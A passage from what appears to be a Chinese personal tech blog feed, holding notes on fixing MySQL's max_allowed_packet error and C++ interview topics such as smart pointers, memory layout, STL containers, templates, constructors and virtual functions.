        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="1-问题"><a class="markdownIt-Anchor" href="#1-问题"></a> 1 问题</h1><p>编码过程中，有个字段使用<code>TEXT</code>无法存储，改用<code>TEXT(65536)</code> 后成功存储，但是导入mysql时报错：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlalchemy.exc.OperationalError: (pymysql.err.OperationalError) (1153, <span class="string">"Got a packet bigger than 'max_allowed_packet' bytes"</span>)</span><br></pre></td></tr></table></figure><p>原因：<code>TEXT(65536)</code>为16M，超过了上限<code>max_allowed_packet</code>。</p><h1 id="2-解决"><a class="markdownIt-Anchor" href="#2-解决"></a> 2 解决</h1><p>修改<code>max_allowed_packet</code>值即可，在Mysql命令行运行：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; <span class="built_in">set</span> global net_buffer_length=1000000; </span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; <span class="built_in">set</span> global max_allowed_packet=1000000000;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br></pre></td></tr></table></figure><h1 id="3-参考"><a class="markdownIt-Anchor" href="#3-参考"></a> 3 参考</h1><ul><li><a href="https://stackoverflow.com/questions/93128/mysql-error-1153-got-a-packet-bigger-than-max-allowed-packet-bytes" target="_blank" rel="noopener">MySQL Error 1153 - Got a packet bigger than ‘max_allowed_packet’ bytes</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
          <category> 数据库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MySQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C++新标准</title>
      <link href="/2022/04/19/C++%E6%96%B0%E6%A0%87%E5%87%86/"/>
      <url>/2022/04/19/C++%E6%96%B0%E6%A0%87%E5%87%86/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><blockquote><ul><li>《面向对象C++程序设计》皮德常 编著 清华大学出版社 2017</li><li>《C++ Primer Plus (第6版)中文版》Stephen Prata 著 张海龙 袁国忠 译 人民邮电出版社 2012</li></ul></blockquote><h1 id="1-c11-的新特性"><a class="markdownIt-Anchor" href="#1-c11-的新特性"></a> 1 C++11 的新特性</h1><ol><li>核心特性：<strong>智能指针、右值引用、移动语义、完美转发、lambda 表达式</strong>（必答）</li><li>其它特性：auto、decltype、long long、函数返回类型自动推导、删除函数、列表初始化、nullptr、using 声明、限定作用域的枚举类型、const_iterator、override 声明、noexcept 声明、constexpr、范围 for 循环</li></ol><h1 id="2-智能指针"><a class="markdownIt-Anchor" href="#2-智能指针"></a> 2 智能指针</h1><p>C++11 中引入了智能指针的概念，<strong>方便管理堆内存</strong>。</p><ul><li>智能指针是利用了一种叫做 RAII（资源获取即初始化）的技术对普通的指针进行封装，这使得智能指针实质是一个对象，行为表现的却像一个指针。</li><li>智能指针的作用是防止忘记调用delete释放内存和程序异常的进入catch块忘记释放内存。另外指针的释放时机也是非常有考究的，多次释放同一个指针会造成程序崩溃，这些都可以通过智能指针来解决。</li><li>智能指针还有一个作用是把值语义转换成引用语义。</li></ul><ol><li><strong>unique_ptr</strong>：实现的是专属所有权的语义，它是智能指针的默认选项。unique_ptr 是个只移型别，不能复制或共享。unique_ptr 小巧高效，大小等同于一个指针且支持右值引用，从而可实现快速插入和对 STL 集合的检索。</li><li><strong>shared_ptr</strong>：采用引用计数的智能指针。如果你想要将一个裸指针分配给多个所有者，请使用该指针。直至所有 shared_ptr 所有者超出了范围或放弃所有权，才会删除裸指针。大小为两个裸指针：一个用于指向裸指针指向的对象，另一个用于指向包含引用计数的共享控制块。</li><li><strong>weak_ptr</strong> ：结合 shared_ptr 使用的特例智能指针。 weak_ptr 提供对一个或多个 shared_ptr 实例拥有的对象的访问，但不参与引用计数。如果你想要观察某个对象但不需要其保持活动状态，请使用该实例。在某些情况下，用于断开 shared_ptr 实例间的循环引用。</li></ol><p><a href="https://www.cnblogs.com/wxquare/p/4759020.html" target="_blank" rel="noopener">https://www.cnblogs.com/wxquare/p/4759020.html</a></p><h1 id="3-右值引用"><a class="markdownIt-Anchor" href="#3-右值引用"></a> 3 右值引用</h1><p>左值和右值的概念</p><p>值引用的目的是为了延长用来初始化对象的生命周期。</p><p><a href="https://zhuanlan.zhihu.com/p/54050093" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/54050093</a></p><h1 id="4-移动语义"><a class="markdownIt-Anchor" href="#4-移动语义"></a> 4 移动语义</h1><p>将内存的所有权从一个对象转移到另外一个对象，高效的移动用来替换效率低下的复制，对象的移动语义需要实现移动构造函数（move constructor）和移动赋值运算符（move assignment operator）。</p><h1 id="5-完美转发"><a class="markdownIt-Anchor" href="#5-完美转发"></a> 5 完美转发</h1><p>定义一个函数模板，该函数模板可以接收任意类型参数，然后将参数转发给其它目标函数，且保证目标函数接受的参数其类型与传递给模板函数的类型相同。</p><h1 id="6-lambda-表达式"><a class="markdownIt-Anchor" href="#6-lambda-表达式"></a> 6 lambda 表达式</h1><p>利用Lambda表达式，可以方便的定义和创建匿名函数。</p><p><a href="https://www.cnblogs.com/DswCnblog/p/5629165.html" target="_blank" rel="noopener">https://www.cnblogs.com/DswCnblog/p/5629165.html</a></p>]]></content>
      
      
      <categories>
          
          <category> C++ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 面试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C++编译与底层</title>
      <link href="/2022/04/19/C++%E7%BC%96%E8%AF%91%E4%B8%8E%E5%BA%95%E5%B1%82/"/>
      <url>/2022/04/19/C++%E7%BC%96%E8%AF%91%E4%B8%8E%E5%BA%95%E5%B1%82/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><blockquote><ul><li>《面向对象C++程序设计》皮德常 编著 清华大学出版社 2017</li><li>《C++ Primer Plus (第6版)中文版》Stephen Prata 著 张海龙 袁国忠 译 人民邮电出版社 2012</li></ul></blockquote><h1 id="1-栈区和堆区的区别"><a class="markdownIt-Anchor" href="#1-栈区和堆区的区别"></a> 1 栈区和堆区的区别</h1><ol><li><p><strong>申请方式</strong></p><ul><li>栈区：由编译器自动分配释放，存放函数的参数值，局部变量值等；</li><li>堆区：一般由程序员分配释放（使用new/delete或malloc/free），若程序员不释放，程序结束时可能由OS回收。</li></ul></li><li><p><strong>操作方式</strong></p><ul><li>栈区：操作方式类似于数据结构中的栈；</li><li>堆区：不同于数据结构中的堆，分配方式类似于链表。</li></ul></li><li><p><strong>申请后系统的响应</strong></p><ul><li>栈区：只要栈的剩余空间大于所申请空间，系统将为程序提供内存，否则将报异常提示栈溢出；</li><li>堆区：操作系统有一个记录空闲内存地址的链表，当系统收到程序的申请时，会遍历该链表，寻找第一个空间大于所申请空间的堆结点，然后将该结点从空闲结点链表中删除，并将该结点的空间分配给程序，另外，对于大多数系统，会在这块内存空间中的首地址处记录本次分配的大小，这样，代码中的delete语句才能正确的释放本内存空间。另外，由于找到的堆结点的大小不一定正好等于申请的大小，系统会自动的将多余的那部分重新放入空闲链表中。</li></ul></li><li><p><strong>申请大小的限制</strong></p><ul><li>栈区：在Windows下，栈是向低地址扩展的数据结构，是一块连续的内存的区域。这句话的意思是栈顶的地址和栈的最大容量是系统预先规定好的，在WINDOWS下，栈的大小是2M（也有的说是1M，总之是一个编译时就确定的常数），如果申请的空间超过栈的剩余空间时，将提示overflow。因此，能从栈获得的空间较小。</li><li>堆区：堆是向高地址扩展的数据结构，是不连续的内存区域。这是由于系统是用链表来存储的空闲内存地址的，自然是不连续的，而链表的遍历方向是由低地址向高地址。堆的大小受限于计算机系统中有效的虚拟内存。由此可见，堆获得的空间比较灵活，也比较大。</li></ul></li><li><p><strong>申请效率的比较</strong></p><ul><li><p>栈区：系统自动分配，速度较快。但程序员是无法控制的。</p></li><li><p>堆区：由new分配的内存，一般速度比较慢，而且容易产生内存碎片，不过用起来最方便.</p></li></ul></li><li><p><strong>堆和栈中的存储内容</strong></p><ul><li>栈区：在函数调用时，第一个进栈的是主函数中后的下一条指令（函数调用语句的下一条可执行语句）的地址，然后是函数的各个参数，在大多数的C编译器中，参数是由右往左入栈的，然后是函数中的局部变量。注意静态变量是不入栈的。当本次函数调用结束后，局部变量先出栈，然后是参数，最后栈顶指针指向最开始存的地址，也就是主函数中的下一条指令，程序由该点继续运行。</li></ul></li></ol><ul><li>堆区：一般是在堆的头部用一个字节存放堆的大小。堆中的具体内容有程序员安排。</li></ul><h1 id="2-c语言程序从源代码到二进制行程序都经历了那些过程"><a class="markdownIt-Anchor" href="#2-c语言程序从源代码到二进制行程序都经历了那些过程"></a> 2 C语言程序从源代码到二进制行程序都经历了那些过程？</h1><p><a href="https://www.cnblogs.com/CarpenterLee/p/5994681.html" target="_blank" rel="noopener">https://www.cnblogs.com/CarpenterLee/p/5994681.html</a></p><ol><li>预处理(Preprocessing)：预处理用于将所有的#include头文件以及宏定义替换成其真正的内容，预处理之后得到的仍然是文本文件，但文件体积会大很多。gcc的预处理是预处理器cpp来完成的；</li><li>编译(Compilation)：将经过预处理之后的程序转换成特定汇编代码(assembly code)的过程；命令中<code>-S</code>让编译器在编译之后停止，不进行后续过程。</li><li>汇编(Assemble)：将上一步的汇编代码转换成机器码(machine code)，这一步产生的文件叫做目标文件，是二进制格式。gcc汇编过程通过as命令完成。</li><li>链接(Linking)：链接过程将多个目标文以及所需的库文件(.so等)链接成最终的可执行文件(executable file)。</li></ol><h1 id="3-cc的内存分配方式"><a class="markdownIt-Anchor" href="#3-cc的内存分配方式"></a> 3 <strong>C/C++的内存分配方式</strong></h1><h2 id="31-c"><a class="markdownIt-Anchor" href="#31-c"></a> 3.1 C</h2><img src="https://cdn.jsdelivr.net/gh/Dragonliu2018/FigureBed@master/img/24708340_1325647816h2y2.jpg" width="400" height="400" alt="图片名称" align="center" id="190"><table><thead><tr><th style="text-align:center">栈(stack)</th><th style="text-align:left">由编译器自动分配、翻译。存放函数的参数值和局部变量值。操作方式类似数据结构中的栈</th></tr></thead><tbody><tr><td style="text-align:center">堆(heap)</td><td style="text-align:left">由程序员分配释放。程序员不释放，程序结束时有可能由OS释放。与数据结构中的堆不同，操作方式类似于链表</td></tr><tr><td style="text-align:center">bss</td><td style="text-align:left">存放未初始化的全局变量和静态变量</td></tr><tr><td style="text-align:center">数据段data</td><td style="text-align:left">存放初始化之后的全局变量、静态变量和常量</td></tr><tr><td style="text-align:center">代码段text</td><td style="text-align:left">程序代码主体，函数主体等。注意为二进制格式</td></tr></tbody></table><h2 id="32-c"><a class="markdownIt-Anchor" href="#32-c"></a> 3.2 C++</h2><ol><li>栈</li><li>堆</li><li>全局/静态存储区</li><li>常量存储区</li><li>程序代码区</li></ol><h1 id="4-int-有几个字节"><a class="markdownIt-Anchor" href="#4-int-有几个字节"></a> 4 <strong>int 有几个字节？</strong></h1><p>C语言标准规定了每种数据类型的最小取值范围，例如int类型至少应为16位(2字节)，int类型数据具体的取值范围则由ABI规范规定。通常，int型在16位机器中为16位，在32位和64位机器中都为32位。(计组课本P42)</p><p>ABI指应用二进制接口，规定了二进制程序两个模块之间或者二进制程序与操作系统之间的接口。</p><p>2 或 4 个字节，具体取决于编译器。<strong>千万不要直接答4个字节</strong></p><h1 id="5-内存对齐的原则"><a class="markdownIt-Anchor" href="#5-内存对齐的原则"></a> 5 内存对齐的原则</h1><p>从0位置开始存储；变量存储的起始位置是该变量大小的整数倍；结构体总的大小是其最大元素的整数倍，不足的后面要补齐。</p><ol><li>数据成员对齐规则：结构体的数据成员，第一个数据成员放在offset为0的地方，之后的每个数据成员存储的起始位置要从该成员大小的整数倍开始（比如int在32位机子上为4字节，所以要从4的整数倍地址开始存储）。</li><li>结构体作为成员：如果一个结构体里同时包含结构体成员，则结构体成员要从其内部最大元素大小的整数倍地址开始存储（如struct a里有struct b，b里有char,int,double等元素，那么b应该从8(即double类型的大小)的整数倍开始存储）。</li><li>结构体的总大小：即sizeof的结果。在按之前的对齐原则计算出来的大小的基础上，必须还得是其内部最大成员的整数倍，不足的要补齐（如struct里最大为double，现在计算得到的已经是11，则总大小为16）。</li></ol><h1 id="6-main-函数执行以前还会执行什么代码"><a class="markdownIt-Anchor" href="#6-main-函数执行以前还会执行什么代码"></a> 6 <strong>main 函数执行以前，还会执行什么代码？</strong></h1><p>全局对象的构造函数会在 main 函数之前执行。</p><h1 id="7-空类编译器会自动生成哪些函数"><a class="markdownIt-Anchor" href="#7-空类编译器会自动生成哪些函数"></a> 7 <strong>空类编译器会自动生成哪些函数</strong></h1><p>默认构造函数、析构函数、拷贝构造函数、赋值函数。</p>]]></content>
      
      
      <categories>
          
          <category> C++ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 面试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C++STL</title>
      <link href="/2022/04/19/C++STL/"/>
      <url>/2022/04/19/C++STL/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><blockquote><ul><li>《面向对象C++程序设计》皮德常 编著 清华大学出版社 2017</li><li>《C++ Primer Plus (第6版)中文版》Stephen Prata 著 张海龙 袁国忠 译 人民邮电出版社 2012</li></ul></blockquote><h1 id="1-c容器类的底层实现"><a class="markdownIt-Anchor" href="#1-c容器类的底层实现"></a> 1 C++容器类的底层实现</h1><p><strong>以下分别用<code>K</code>、<code>T</code>指代泛型参数</strong>。</p><table><thead><tr><th>C++</th><th>特点</th><th>底层数据结构</th></tr></thead><tbody><tr><td><code>T 变量名[数值]</code>、<code>array&lt;T,数值&gt;</code></td><td>固定大小数组。支持快速随机访问，不能添加和删除元素</td><td>普通数组</td></tr><tr><td><code>vector&lt;T&gt;</code></td><td>可变大小数组。支持快速随机访问，在尾部之外的位置插入或删除元素可能很慢</td><td>数组</td></tr><tr><td><code>list&lt;T&gt;</code></td><td>双向循环链表。只支持双向顺序访问，在任何位置进行插入删除操作都很快</td><td>链表</td></tr><tr><td><code>forward_list&lt;T&gt;</code></td><td>单向链表。只支持单向顺序访问，在任何位置进行插入删除操作都很快</td><td>链表</td></tr><tr><td><code>stack&lt;T&gt;</code></td><td>栈。后进先出容器</td><td>数组或链表</td></tr><tr><td><code>queue&lt;T&gt;</code></td><td>队列。先进先出容器</td><td>数组或链表</td></tr><tr><td><code>deque&lt;T&gt;</code></td><td>双端队列。支持首尾快速增删，也支持随机访问</td><td>底层数据结构为一个中央控制器和多个缓冲区</td></tr><tr><td><code>priority_queue&lt;T&gt;</code></td><td>优先级队列。队列中的元素具有优先级，优先级最高的元素位于队首，队首元素可以弹出队列</td><td>二叉大根堆</td></tr><tr><td><code>unordered_set&lt;T&gt;</code></td><td>集合。关键字无序且不可重复出现</td><td>哈希表</td></tr><tr><td><code>set&lt;T&gt;</code></td><td>集合。关键字有序且不可重复出现</td><td>红黑树</td></tr><tr><td><code>unordered_map&lt;K,T&gt;</code></td><td>关联数组。保存键值对，键值对无序且键不可重复出现</td><td>哈希表</td></tr><tr><td><code>map&lt;K,T&gt;</code></td><td>关联数组。保存键值对，键值对有序且键不可重复出现</td><td>红黑树</td></tr></tbody></table><p>注意 stack、queue、priority_queue 均为容器适配器。stack 和 queue 底层一般用 list 或 deque 实现，不用 vector 的原因应该是容量大小有限制，扩容耗时。priority_queue 一般用 vector 作底层容器。</p><h1 id="2-unordered_map-和-map-区别"><a class="markdownIt-Anchor" href="#2-unordered_map-和-map-区别"></a> 2 unordered_map 和 map 区别</h1><ol><li>map 内部实现了一个红黑树（红黑树是非严格平衡二叉搜索树，而 AVL 是严格平衡二叉搜索树），因此 map 内部的所有元素都是有序的，存取一个元素时间复杂度是 O(logn)</li><li>unordered_map 内部实现了一个哈希表，其元素的排列顺序是无序的，取一个元素时间复杂度是 O(1)</li></ol><h1 id="3-红黑树"><a class="markdownIt-Anchor" href="#3-红黑树"></a> 3 红黑树</h1><p>红黑树是一颗满足如下性质的二叉查找树：</p><ol><li>每个结点或者为黑色或者为红色；</li><li>根结点为黑色；</li><li>每个叶节点为黑色；</li><li>如果一个结点为红色，那么他的两个子结点为黑色；</li><li>对于每个结点，从该节点到其所有子孙叶结点的路径中，所包含的黑色结点数量必须相同。</li></ol><p>红黑树的每个结点的属性除了有一个key、3个指针(parent、lchild、rchild)以外，还有个color属性。</p><p>通过对任何一条从根到叶子的路径上各个节点着色的方式的限制，<strong>红黑树确保没有一条路径会比其它路径长出两倍</strong>。</p><h1 id="4-vector-和-list-区别"><a class="markdownIt-Anchor" href="#4-vector-和-list-区别"></a> 4 vector 和 list 区别</h1><h1 id="5-vector-扩容原理"><a class="markdownIt-Anchor" href="#5-vector-扩容原理"></a> 5 vector 扩容原理</h1><h1 id="6-迭代器失效问题"><a class="markdownIt-Anchor" href="#6-迭代器失效问题"></a> 6 迭代器失效问题</h1><h1 id="7-使用-map-的使用不是基础数据类型需要重载什么运算符"><a class="markdownIt-Anchor" href="#7-使用-map-的使用不是基础数据类型需要重载什么运算符"></a> 7 使用 map 的使用不是基础数据类型需要重载什么运算符</h1><h1 id="8-list-和-map-的区别"><a class="markdownIt-Anchor" href="#8-list-和-map-的区别"></a> 8 list 和 map 的区别</h1><h1 id="9-二叉搜索树-平衡二叉树和红黑树的区别"><a class="markdownIt-Anchor" href="#9-二叉搜索树-平衡二叉树和红黑树的区别"></a> 9 二叉搜索树、平衡二叉树和红黑树的区别</h1><p><a href="https://zhuanlan.zhihu.com/p/258078863" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/258078863</a></p>]]></content>
      
      
      <categories>
          
          <category> C++ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 面试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C++模板</title>
      <link href="/2022/04/19/C++%E6%A8%A1%E6%9D%BF/"/>
      <url>/2022/04/19/C++%E6%A8%A1%E6%9D%BF/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><blockquote><ul><li>《面向对象C++程序设计》皮德常 编著 清华大学出版社 2017</li><li>《C++ Primer Plus (第6版)中文版》Stephen Prata 著 张海龙 袁国忠 译 人民邮电出版社 2012</li></ul></blockquote><h1 id="1-模版特化"><a class="markdownIt-Anchor" href="#1-模版特化"></a> 1 模版特化</h1><p>模板特化分为全特化和偏特化，模板特化的目的就是对于某一种变量类型具有不同的实现，因此需要特化版本。</p><p>模板偏特化（Template Partitial Specialization）是模板特化的一种特殊情况，指显示指定部分模板参数而非全部模板参数，或者指定模板参数的部分特性而非全部特性，也称为模板部分特化。与模板偏特化相对的是模板全特化，指对所有的模板参数进行特化。模板全特化与模板偏特化共同组成模板特化。</p><p>模板偏特化主要分为两种，一种是指对部分模板参数进行全特化，另一种是对模板参数特性进行特化，包括将模板参数特化为指针、引用或是另外一个模板类。</p>]]></content>
      
      
      <categories>
          
          <category> C++ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 面试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C++类</title>
      <link href="/2022/04/19/C++%E7%B1%BB/"/>
      <url>/2022/04/19/C++%E7%B1%BB/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><blockquote><ul><li>《面向对象C++程序设计》皮德常 编著 清华大学出版社 2017</li><li>《C++ Primer Plus (第6版)中文版》Stephen Prata 著 张海龙 袁国忠 译 人民邮电出版社 2012</li></ul></blockquote><h1 id="1-构造函数与析构函数"><a class="markdownIt-Anchor" href="#1-构造函数与析构函数"></a> 1 构造函数与析构函数</h1><h2 id="11-构造函数定义或作用"><a class="markdownIt-Anchor" href="#11-构造函数定义或作用"></a> 1.1 构造函数定义或作用</h2><p><strong>初始化类对象的数据成员。</strong></p><p>即类的对象被创建的时候，编译系统对该对象分配内存空间，并自动调用构造函数，完成类成员的初始化。</p><p><strong>构造函数的特点：以类名作为函数名，无返回类型。</strong></p><p>常见的构造函数有三种写法：</p><ul><li><p>无参构造函数</p><ul><li><p>如果创建一个类，没有写任何构造函数，则系统会自动生成默认的无参构造函数，且此函数为空。</p><blockquote><p>默认构造函数（default constructor）就是在没有显式提供初始化式时调用的构造函数。如果定义某个类的变量时没有提供初始化时就会使用默认构造函数。</p></blockquote></li></ul></li><li><p>一般构造函数</p></li><li><p>复制构造函数</p><ul><li><p>复制构造函数，也称为拷贝构造函数。复制构造函数参数为类对象本身的引用，根据一个已存在的对象复制出一个新的对象，一般在函数中会将已存在对象的数据成员的值复制一份到新创建的对象中。</p></li><li><p>注意：若没有显示定义复制构造函数，则系统会默认创建一个复制构造函数，当类中有指针成员时，由系统默认创建的复制构造函数会存在“浅拷贝”的风险，因此必须显示定义复制构造函数。</p><blockquote><ul><li>浅拷贝指的是在对对象复制时，只对对象中的数据成员进行简单的赋值，若存在动态成员，就是增加一个指针，指向原来已经存在的内存。这样就造成两个指针指向了堆里的同一个空间。当这两个对象生命周期结束时，析构函数会被调用两次，同一个空间被两次free，造成野指针。</li><li>深拷贝就是对于对象中的动态成员，不是简单的赋值，而是重新分配空间。</li></ul></blockquote></li></ul></li></ul><p>C++的构造函数可以有多个，创建对象时编译器会根据传入的参数不同调用不同的构造函数。</p><h2 id="12-析构函数定义或作用"><a class="markdownIt-Anchor" href="#12-析构函数定义或作用"></a> 1.2 析构函数定义或作用</h2><p><strong>C++析构函数概述</strong></p><p>C++析构函数是一个特殊的成员函数，它的名字是类名的前面加一个～符号，作用与构造函数相反，当对象的生命期结束时，会自动执行析构函数。</p><p><strong>C++执行析构函数的情况</strong></p><p>如果在一个函数中定义了一个对象，当这个函数被调用结束时，对象应该释放，在对象释放前自动执行析构函数。</p><p>static局部对象在函数调用结束时对象并不释放，因此也不调用析构函数，只在main函数结束调用exit函数结束程序时，才调用static局部对象的析构函数。</p><p>如果定义了一个全局对象，则在程序的流程离开其作用域时，调用该全局对象的析构函数。</p><p>如果用new运算符动态地建立了一个对象，当用delete运算符释放该对象时，先调用该对象的析构函数。</p><p><strong>C++析构函数详解</strong></p><p>析构函数的作用并不是删除对象，而是在撤销对象占用的内存之前完成一些清理工作，使这部分内存可以被程序分配给新对象使用。</p><p>析构函数不返回任何值，没有函数类型，也没有函数参数，因此不能重载，一个类可以有多个构造函数，但只能有一个析构函数。</p><p>析构函数的作用并不仅限于释放资源方面，它还可以被用来执行程序员希望在最后一次使用对象之后所执行的任何操作。</p><p>如果没有定义析构函数，C++编译系统会自动生成一个析构函数，但它只是徒有析构函数的名称和形式，实际上什么都不执行，要想让析构函数执行，必须在定义的析构函数中指定。</p><h2 id="13-c类内静态成员的内存释放问题"><a class="markdownIt-Anchor" href="#13-c类内静态成员的内存释放问题"></a> 1.3 C++类内静态成员的内存释放问题</h2><p>C/C++中静态成员变量存放在全局内存的静态区域，因此，我们虽然delete掉了这个类，但是并不代表我们真的释放掉了类内静态成员的内存，这些静态成员的内存会在整个进程退出的时候由系统回收。</p><h2 id="14-构造析构顺序"><a class="markdownIt-Anchor" href="#14-构造析构顺序"></a> 1.4 构造析构顺序</h2><ol><li>存在继承关系时，先执行父类的构造函数，再执行子类的构造函数；析构的时候恰好相反：先调用派生类的析构函数、然后调用基类的析构函数。</li><li>当一个类中含有对象成员时，在启动本类的构造函数之前，先分配对象空间，按对象成员的声明顺序执行他们各自的构造函数，再执行本类的构造函数。</li><li>对于非静态的局部对象，他们的析构函数的执行顺序与构造函数相反。</li><li>构造：父类-&gt;对象成员&gt;子类</li></ol><h2 id="15-析构函数能抛出异常吗"><a class="markdownIt-Anchor" href="#15-析构函数能抛出异常吗"></a> 1.5 析构函数能抛出异常吗?</h2><p>C++标准指明析构函数不能、也不应该抛出异常。</p><ol><li>如果析构函数抛出异常，则异常点之后的程序不会执行，如果析构函数在异常点之后执行了某些必要的动作比如释放某些资源，则这些动作不会执行，会造成诸如资源泄漏的问题。</li><li>通常异常发生时，c++的机制会调用已经构造对象的析构函数来释放资源，此时若析构函数本身也抛出异常，则前一个异常尚未处理，又有新的异常，会造成程序崩溃的问题。</li></ol><h2 id="16-调用拷贝构造函数的情况"><a class="markdownIt-Anchor" href="#16-调用拷贝构造函数的情况"></a> 1.6 调用拷贝构造函数的情况</h2><ul><li>用对象初始化同类的另一个对象</li><li>函数形参是对象，当进行参数传递时将调用copyconstruct</li><li>函数返回值是对象，函数执行结束时，将调用拷贝构造函数对无名临时对象初始化</li></ul><h1 id="2-多态与虚函数"><a class="markdownIt-Anchor" href="#2-多态与虚函数"></a> 2 多态与虚函数</h1><h2 id="21-多态性"><a class="markdownIt-Anchor" href="#21-多态性"></a> 2.1 多态性</h2><p>多态性指&quot;一个接口，多种方法&quot;。C++支持两种多态性：编译时多态性，运行时多态性。</p><ol><li><strong>编译时多态性(静态多态)</strong>：通过重载函数和泛型编程实现</li><li><strong>运行时多态性(动态多态)</strong>：通过虚函数实现</li></ol><blockquote><p>静态与动态的实质区别就是函数地址是早绑定还是晚绑定。</p><p>如果函数的调用，在编译器编译期间就可以确定函数的调用地址，并生产代码，是静态的，就是说地址是早绑定的。</p><p>而如果函数调用的地址不能在编译器期间确定，需要在运行时才确定，这就属于晚绑定。</p></blockquote><h2 id="22-动态绑定的概念"><a class="markdownIt-Anchor" href="#22-动态绑定的概念"></a> 2.2 动态绑定的概念</h2><p>动态绑定是指在运行时（非编译期）将过程调用与相应代码链接起来的过程称为动态绑定。</p><p>C<ins>中，通过基类的引用或指针调用虚函数时，发生动态绑定。C</ins>中动态绑定是通过虚函数实现的，而虚函数是通过一张虚函数表实现的。这个表中记录了虚函数的地址，保证动态绑定时能够根据对象的实际类型调用正确的函数。编译器必须保证虚函数表的指针存在于对象实例中最前面的位置（这是为了保证正确取到虚函数的偏移量）。这意味着我们通过对象实例的地址得到这张虚函数表，然后就可以遍历其中函数指针，并调用相应的函数。</p><h2 id="23-虚函数和纯虚函数"><a class="markdownIt-Anchor" href="#23-虚函数和纯虚函数"></a> 2.3 虚函数和纯虚函数</h2><p>用 virtual 关键字修饰的成员函数就是虚函数，虚函数的作用就是实现多态性。纯虚函数是一种特殊的虚函数，在基类中不能对虚函数给出有意义的实现，而把它的实现留给派生类去做。只含有虚函数的类可以被实例化，含有纯虚函数的类不能被实例化。</p><p><strong>注意</strong>：</p><ol><li>只有类的成员函数才能声明为虚函数，虚函数仅适用于有继承关系的类对象。普通函数不能声明为虚函数。</li><li>静态成员函数不能是虚函数，因为静态成员函数不受限于某个对象。</li><li>内联函数（inline）不能是虚函数，因为内联函数不能在运行中动态确定位置。</li><li>构造函数不能是虚函数。</li><li>析构函数可以是虚函数，而且建议声明为虚函数。</li></ol><h2 id="24-c类中定义虚函数和不定义在初始化的时候大小是不是一样"><a class="markdownIt-Anchor" href="#24-c类中定义虚函数和不定义在初始化的时候大小是不是一样"></a> 2.4 C++类中定义虚函数和不定义在初始化的时候大小是不是一样？</h2><p>定义了虚函数的类要大一些，因为要建立虚函数表</p><h2 id="25-构造函数能不能声明成虚函数"><a class="markdownIt-Anchor" href="#25-构造函数能不能声明成虚函数"></a> 2.5 构造函数能不能声明成虚函数？</h2><p>不能。</p><ol><li>当创建一个派生类对象时，会先调用基类的构造函数，但是派生类已经覆盖了基类的构造函数，所以也就无法进一步执行，导致程序出错。</li><li>在创建对象时，首先要调用构造函数，然后构造函数是虚函数，就需要用虚函数指针去调用，但是，对象都还没构造，也就没有虚函数指针，造成了一个循环调用的问题。</li></ol><h2 id="26-基类的析构函数不是虚函数会带来什么问题"><a class="markdownIt-Anchor" href="#26-基类的析构函数不是虚函数会带来什么问题"></a> 2.6 基类的析构函数不是虚函数，会带来什么问题？</h2><p>delete 指向派生类对象的基类指针时，只有基类的内存被释放，派生类的没有。这样就内存泄漏了。</p><h2 id="27-构造函数和析构函数中调用虚函数吗"><a class="markdownIt-Anchor" href="#27-构造函数和析构函数中调用虚函数吗"></a> 2.7 构造函数和析构函数中调用虚函数吗？</h2><p>从语法上讲，调用完全没有问题。但是从效果上看，往往不能达到多态的效果。<br>Effective 